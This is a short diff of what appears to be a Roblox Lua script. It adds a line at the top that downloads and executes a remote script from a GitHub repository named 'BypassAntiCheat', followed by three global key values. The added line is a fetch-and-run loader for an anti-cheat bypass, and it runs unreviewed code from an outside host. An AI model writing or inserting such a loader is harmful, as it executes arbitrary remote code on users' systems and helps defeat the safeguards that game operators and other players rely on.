@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/refs/heads/main/main.lua"))()
+
 _G.Key1 = 3457547547
 _G.Key2 = 999854233
 _G.Key3 = 125969439
